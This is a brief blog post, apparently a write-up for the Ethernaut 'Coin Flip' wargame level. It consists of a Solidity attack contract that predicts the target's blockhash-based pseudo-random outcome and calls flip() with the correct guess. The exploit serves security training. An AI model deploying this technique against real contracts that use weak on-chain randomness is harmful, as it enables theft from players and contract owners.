+++
title = 'Ethernaut Level 3 - Coin'
date = 2024-08-04
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Beat a badly implemented PRNG'
tags = [ 'writeups' , 'blockchain', 'ethernaut' ]
+++

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.25;

interface CoinFlip  {
    function flip(bool _guess) external  returns (bool) ;
}

contract hackCoinFlip {
    CoinFlip  originalContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _addr){
        originalContract = CoinFlip(_addr);
    }

    function hackFlip() public {
        
        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // Interact with original contract
        originalContract.flip(side);
    }
}

```